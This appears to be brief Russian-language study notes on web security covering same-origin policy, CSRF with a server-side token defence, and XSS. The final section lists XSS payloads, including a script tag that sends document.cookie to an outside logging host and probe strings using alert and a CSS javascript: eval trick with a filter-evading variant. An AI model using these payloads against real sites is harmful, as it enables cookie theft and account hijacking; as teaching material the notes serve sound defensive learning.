
**Same-origin policy (SOP)** это основной механизм защиты данных и методов, пришедших из разных источников.

**CSRF** расшифровывается как cross-site request forgery. Данная атака базируется на одной из основных идей www - идее о том, что страницы могут включать в себя содержимое из разных источников. Это достаточно простая атака, но может дать весьма интересные результаты при грамотном подходе.  
Защита от атаки, это добавление в параметр ключа (индетификатор) который генерируется на стороне сервера на одну страницу.

**XSS-атаки** - пожалуй, самый распространенный тип атак. Найти просто - всё, что нужно, это тщательно изучить код страницы и входные параметры. Защититься проблематично - вылезать может в совершенно неожиданных местах. Степень опасности - от незначительной до … просто почитайте эту историю, почти технотриллер, о том, как поломали apache.org: [https://blogs.apache.org/infra/entry/apache\_org\_04\_09\_2010](https://web.archive.org/web/20210122152139/https://blogs.apache.org/infra/entry/apache_org_04_09_2010)﻿  
Про уязвимость [от гугла](https://web.archive.org/web/20210122152139/https://www.google.com/about/appsecurity/learning/xss/)

Примеры XSS атак

<script src\="http://logger.com/?c="+encodeURL(document.cookie)\></script>

Проверка на наличие уязвимости

RRR'\><"{}()
<script>alert(1)</script>
<div id="mycode" expr="alert('hah!')" style="background:url('javascript:eval(document.all.mycode.expr)')">
<div id="mycode" expr="alert('hah!')" style="background:url('javas\\ncript:eval(document.all.mycode.expr)')">
